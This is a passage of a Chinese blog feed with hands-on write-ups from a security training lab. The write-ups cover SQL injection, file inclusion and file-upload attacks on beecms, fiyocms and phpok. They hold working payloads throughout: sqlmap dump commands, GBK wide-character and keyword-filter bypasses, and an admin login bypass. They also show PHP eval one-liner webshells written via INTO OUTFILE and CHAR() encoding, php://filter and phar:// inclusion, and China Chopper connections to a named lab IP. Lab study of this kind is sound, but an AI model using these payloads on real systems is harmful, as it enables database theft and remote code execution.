<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T --dbs</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T -D hetianlab --tables</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T -D hetianlab -T<span class="built_in"> user </span>--columns</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T -D hetianlab -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure>



<h2 id="宽字符注入"><a href="#宽字符注入" class="headerlink" title="宽字符注入"></a>宽字符注入</h2><p>输入单引号被斜杠转义，想方法把斜杠去掉，提示宽字符所以用gbk编码。第一个字节采用大于128的编码即可。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span>%<span class="number">9</span>c%<span class="number">27</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>成功绕过。直接查表</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>=-1%9c%27 union select 1,username,password <span class="keyword">from</span><span class="built_in"> user </span>%23</span><br></pre></td></tr></table></figure>

<p>用户名： admin </p>
<p>密码： 21232f297a57a5a743894a0e4a801fc3 </p>
<p>或者sqlmap:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1%9c%27"</span> -D hetianlab -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure>





<h2 id="绕过select过滤"><a href="#绕过select过滤" class="headerlink" title="绕过select过滤"></a>绕过select过滤</h2><p>尝试<code>union%20select%201,2,3</code>,发现select 被过滤了。</p>
<p>尝试重写绕过<code>union seselectlect 1,2,3</code>成功。或者大小写绕过也成功<code>union Select 1,2,3</code>成功。</p>
<p>过滤语句应该是进行简单的替换。</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">id = <span class="number">1</span> <span class="class"><span class="keyword">union</span>%20<span class="title">Select</span>%201,<span class="title">username</span>,<span class="title">password</span>%20<span class="title">from</span>%20<span class="title">user</span></span></span><br></pre></td></tr></table></figure>

<p>账户名： admin ，密码： 21232f297a57a5a743894a0e4a801fc3</p>
<p>或者sqlmap:</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://47.105.75.177/vulnlab/sqli/index5.php?id=1"</span> --tamper <span class="string">"nonrecursivereplacement.py"</span></span><br></pre></td></tr></table></figure>



<h2 id="进阶之真实案例"><a href="#进阶之真实案例" class="headerlink" title="进阶之真实案例"></a>进阶之真实案例</h2><p>随便浏览发现可能注入点：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/</span>product<span class="regexp">/product.php?id=5</span></span><br></pre></td></tr></table></figure>

<p>多番尝试后发现注不出来。</p>
<p>dirsearch扫描。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms -e php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">56</span>] <span class="number">301</span> -  <span class="number">255</span>B  - /vulnlab/sqli/beecms/admin  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/admin/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">403</span> -  <span class="number">237</span>B  - /vulnlab/sqli/beecms/admin/.htaccess</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/?/login  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/admin.php  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/index.php  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">58</span>] <span class="number">200</span> -    <span class="number">2</span>KB - /vulnlab/sqli/beecms/admin/login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">58</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/upload.php  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">02</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/article  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/article/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">04</span>] <span class="number">301</span> -  <span class="number">254</span>B  - /vulnlab/sqli/beecms/book  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/book/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">05</span>] <span class="number">301</span> -  <span class="number">258</span>B  - /vulnlab/sqli/beecms/ckeditor  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/ckeditor/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">05</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/ckeditor/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">07</span>] <span class="number">301</span> -  <span class="number">254</span>B  - /vulnlab/sqli/beecms/data  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/data/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">08</span>] <span class="number">301</span> -  <span class="number">254</span>B  - /vulnlab/sqli/beecms/down  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/down/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">11</span>] <span class="number">301</span> -  <span class="number">258</span>B  - /vulnlab/sqli/beecms/includes  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/includes/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">11</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/includes/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">11</span>] <span class="number">200</span> -   <span class="number">18</span>KB - /vulnlab/sqli/beecms/index.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">12</span>] <span class="number">200</span> -   <span class="number">18</span>KB - /vulnlab/sqli/beecms/index.php/login/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">12</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/install  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/install/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">12</span>] <span class="number">200</span> -   <span class="number">89</span>B  - /vulnlab/sqli/beecms/install/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">13</span>] <span class="number">301</span> -  <span class="number">259</span>B  - /vulnlab/sqli/beecms/languages  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/languages/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">14</span>] <span class="number">301</span> -  <span class="number">256</span>B  - /vulnlab/sqli/beecms/member  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/member/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">14</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/member/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">19</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/product  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/product/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">20</span>] <span class="number">200</span> -  <span class="number">140</span>B  - /vulnlab/sqli/beecms/robots.txt</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">20</span>] <span class="number">301</span> -  <span class="number">256</span>B  - /vulnlab/sqli/beecms/search  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/search/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">21</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/sitemap  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/sitemap/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">23</span>] <span class="number">301</span> -  <span class="number">258</span>B  - /vulnlab/sqli/beecms/template  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/template/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">23</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/template/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">24</span>] <span class="number">301</span> -  <span class="number">256</span>B  - /vulnlab/sqli/beecms/upload  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/upload/</span></span><br></pre></td></tr></table></figure>

<p>发现后台地址：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/</span>admin<span class="regexp">/</span></span><br></pre></td></tr></table></figure>

<p>尝试sql注入:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admin' or <span class="number">1</span></span><br><span class="line">密码：<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>报错:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MariaDB<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span> limit 0,1<span class="string">' at line 1</span></span><br><span class="line"><span class="string">sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name='</span>admin<span class="string">' or 1'</span> limit 0,1</span><br></pre></td></tr></table></figure>

<p>现在直接构造payload注入：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">用户名：admin<span class="string">' and '</span><span class="number">1</span></span><br><span class="line">密码：<span class="number">123</span></span><br></pre></td></tr></table></figure>



<p>提示不存在用户。尝试另外种思路：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' union select <span class="number">1</span>,<span class="number">2</span>,'pwd',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码： pwd</span><br></pre></td></tr></table></figure>

<p>报错：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,admin_name,admin_password,admin_purview,is_disable <span class="keyword">from</span> bees_admin <span class="keyword">where</span> admin_name=<span class="string">'admi'</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'pwd'</span>,<span class="number">4</span>,<span class="number">5</span> <span class="comment">#' limit 0,1</span></span><br></pre></td></tr></table></figure>

<p>发现union 和select被过滤了。</p>
<p>尝试绕过方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）UnunionIon  显示UnunionIon</span><br><span class="line">（2）Union 显示空</span><br><span class="line">（2）Un union ion 显示union 成功绕过。</span><br></pre></td></tr></table></figure>

<p>重新构造payload:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se select lect <span class="number">1</span>,<span class="number">2</span>,'pwd',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码： pwd</span><br></pre></td></tr></table></figure>

<p>发现select函数有问题了，</p>
<p>尝试绕过方法：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">Se<span class="symbol">%select</span><span class="symbol">%lect</span>  显示<span class="keyword">select</span></span><br></pre></td></tr></table></figure>

<p>再构造payload:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,<span class="number">2</span>,'pwd',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码： pwd</span><br></pre></td></tr></table></figure>

<p>说密码正确，猜想密码是密文保存的。用md5。</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,<span class="number">2</span>,'<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure>

<p>注入成功，提示该账号被锁定，无法登录。</p>
<p>发现字段is_disable被设置成5所以不能登录，改下payload:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,'admin','<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">0</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure>

<p>成功登录。</p>
<p>尝试文件注入：</p>
<p>首先绕过Into，outfile关键词，用<code>I into nto, O%outfile%utfile</code>替换</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">用户名： admi<span class="string">' Un union ion Se%select%lect 1,'</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[x]);<span class="meta">?&gt;</span><span class="string">',3,4,5 I into nto  O%outfile%utfile '</span>shell.php<span class="string">' #</span></span><br></pre></td></tr></table></figure>



<p>test:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admi' Un union ion Se%<span class="keyword">select</span>%lect <span class="number">1</span>,<span class="string">'&lt;?php echo 1;?&gt;'</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> I <span class="keyword">into</span> nto  O%<span class="keyword">outfile</span>%utfile <span class="string">'../upload/shell1.php'</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>报错:</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">操作数据库失败Can<span class="string">'t create/write to file '</span>/var/<span class="class"><span class="keyword">lib</span>/<span class="title">mysql</span>/<span class="title">upload</span>/<span class="title">shell1</span>.<span class="title">php</span>'</span></span><br></pre></td></tr></table></figure>



<p>猜测路径：<br>/var/www/html/vulnlab/sqli/beecms/upload/</p>
<p>构造payload上传即可。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">admi<span class="string">' Un union ion Se%select%lect 1,'</span>&lt;?php @eval(<span class="variable">$_POST</span>[x]);?&gt;<span class="string">',3,4,5 I into nto  O%outfile%utfile '</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/sqli/</span>beecms<span class="regexp">/upload/</span>shell.php<span class="string">' #</span></span><br></pre></td></tr></table></figure>

<p>测试下：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">admi<span class="string">' Un union ion Se%select%lect 1,'</span>&lt;?php echo <span class="number">1</span>?&gt;<span class="string">',3,4,5 I into nto  O%outfile%utfile '</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/sqli/</span>beecms<span class="regexp">/upload/</span><span class="number">1</span>.php<span class="string">' #</span></span><br></pre></td></tr></table></figure>

<p>发现内容为：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&amp;lt;?php echo <span class="number">1</span>;?&amp;gt;	<span class="number">3</span>	<span class="number">4</span>	<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>所有特殊字符被转义了。所以利用胖白老大讲的char函数。</p>
<p>利用hackbar生成</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">CHAR(<span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">71</span>, <span class="number">69</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">120</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>)</span><br></pre></td></tr></table></figure>

<p>所以payload为</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">admi' Un union ion Se%select%lect <span class="number">1</span>,CHAR(<span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">120</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> I into nto  O%outfile%utfile '/var/www/html/vulnlab/sqli/beecms/upload/shell2.php' #</span><br></pre></td></tr></table></figure>

<p>然后用菜刀连接即可。</p>
<p>注意点：一句话木马是用的POST不是GET</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>合天培训_实验_文件包含漏洞</title>
    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。</p>
<a id="more"></a>

<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>（1）提示include.php，访问include.php</p>
<p>（2）提示参数为file.利用file=include.php发现文件包含生效。</p>
<p>（3）尝试读取源代码</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=<span class="built_in">include</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200421212856583-1588308709161.png" alt="image-20200421212856583"></p>
<p>base64解码后：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Tips: the parameter is file! :) </span><br><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    @$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>



<p>可以看到有后名单机制，包括http,data,ftp,input，而且是大小写不敏感。</p>
<p>（4）注意到注释中有upload.php。访问upload.php。发现可以文件上传（这里也可以用fuzz来找到upload.php）。</p>
<p>上传一个一句话木马post.php。发现上传失败</p>
<p>因为有文件包含漏洞，所以只要不是文件内容检测都能绕过，将post.php改为post.png.</p>
<p>上传成功：</p>
<p><img src="/assets/image-20200421225912301-1588308709163.png" alt="image-20200421225912301"></p>
<p>接下来进行文件包含。</p>
<p> <a href="http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png" target="_blank" rel="noopener">http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png</a> </p>
<p>利用菜刀连接即可。</p>
<p><img src="/assets/image-20200421230943902-1588308709163.png" alt="image-20200421230943902"></p>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>（1）参数有file,提示php文件。代表只输入文件名就可以。</p>
<p>猜测代码：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>].<span class="string">"php"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>（2）读源码</p>
<p>file=php://filter/convert.base64-encode/resource=include</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Tips:  </span><br><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    @$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($file.<span class="string">'.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>题目要求phar，现在上传一个zip文件。</p>
<p><img src="/assets/image-20200421231446262-1588308709163.png" alt="image-20200421231446262"></p>
<p>发现不能上传zip。抓包看下是基于什么机制过滤的。</p>
<p>发现Mime类型不行。加点大小写什么的都不行。文件上传这个点做的比较严格。但是因为有文件包含漏洞，所以我的zip后缀改为任意的都行，比如改为jpg</p>
<p><img src="/assets/image-20200421232107205-1588308709164.png" alt="image-20200421232107205"></p>
<p>然后利用phar协议访问zip中的post.php</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//u</span>pload<span class="regexp">/webshell.jpg/</span>post.php</span><br></pre></td></tr></table></figure>

<p>用菜刀连接尝试,发现连接失败。</p>
<p>看了下路径不对，第二道题和第一道题不是在同一个路径下，改一下路径：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//</span>..<span class="regexp">/1/u</span>pload<span class="regexp">/webshell.jpg/</span>post.php</span><br></pre></td></tr></table></figure>

<p>发现报错error。</p>
<p>再想一下，不仅忘记去掉后缀名php了，而且不支持..</p>
<p>尝试使用绝对路径</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/include/</span><span class="number">1</span><span class="regexp">/upload/</span>webshell.jpg<span class="regexp">/post</span></span><br></pre></td></tr></table></figure>

<p>菜刀连接，成功连接</p>
<p><img src="/assets/image-20200421233702677-1588308709164.png" alt="image-20200421233702677"></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>合天培训_实验_文件上传考核</title>
    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%80%83%E6%A0%B8/</url>
    <content><![CDATA[<p>本文主要讲解几个cms中出现的文件上传漏洞，以及对应的攻击方法。</p>
<a id="more"></a>

<h2 id="1-beecms"><a href="#1-beecms" class="headerlink" title="1.beecms"></a>1.beecms</h2><p>首先后台登录</p>
<p>绕过登录方法：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,'admin','<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">0</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure>

<p>在后台发现上传图片功能：</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">http://47.105.75.177/vulnlab/sqli/beecms/admin/admin_content.php?action=<span class="meta">add</span><span class="variable">&amp;id</span>=3<span class="variable">&amp;nav</span>=add_channel_product<span class="variable">&amp;admin_p_nav</span>=content<span class="variable">&amp;lang</span>=cn</span><br></pre></td></tr></table></figure>

<p>实际检测，发现是MIME白名单检测，所以Burp改包即可。</p>
<p>然后在图片管理中可以看到上传的文件的路径：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/u</span>pload<span class="regexp">/img/</span><span class="number">202004201359505400</span>.php</span><br></pre></td></tr></table></figure>



<h2 id="2-fiyocms"><a href="#2-fiyocms" class="headerlink" title="2.fiyocms"></a>2.fiyocms</h2><p>账户密码admin/admin888登录</p>
<p>找到上传文件的点：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/47.105.75.177/vulnlab</span><span class="regexp">/upload/fiyocms</span><span class="regexp">/dapur/</span>?app=media&amp;<span class="keyword">type</span>=files</span><br></pre></td></tr></table></figure>

<p>但是上传按钮按不动。其他功能点也没有上传的，放弃。</p>
<p>老师讲了后发现themes下面有漏洞。</p>
<p>（1）任意文件读取</p>
<p>（2）任意文件上传</p>
<h2 id="3-phpok"><a href="#3-phpok" class="headerlink" title="3.phpok"></a>3.phpok</h2><p>账户密码admin/admin登录</p>
<p>找到修改头像的点，发现只能上传图像。</p>
<p>上传一个后缀名改为gif的php代码。</p>
<p>然后改包：</p>
<p><img src="/assets/image-20200420145021307.png" alt="image-20200420145021307"></p>
<p>发现php被过滤了。</p>
<p>php fuzz测试。发现均被过滤了。</p>
<p>换思路，扫后台</p>
<p>扫出admin.php</p>
<p>登录发现不正确，应该用户表和管理员表是两张。</p>
<p>用户名：admin,密码： admin888 (利用其他网站的sql注入获得)</p>
<p>在工具，附件分类管理中gif,png,jpg后面再加个php。然后再文件上传即可。</p>
<p><img src="/assets/image-20200420154112973.png" alt="image-20200420154112973"></p>
<p>看burp包得到上传路径：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">res/<span class="number">202004</span>/<span class="number">20</span>/<span class="number">1555e119f</span>9dc2b1f.php</span><br></pre></td></tr></table></figure>

<p>访问资源即可：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/phpok/</span>res<span class="regexp">/202004/</span><span class="number">20</span><span class="regexp">/1555e119f9dc2b1f.php</span></span><br></pre></td></tr></table></figure>

<p>为了方便其他同学做再改回去。</p>
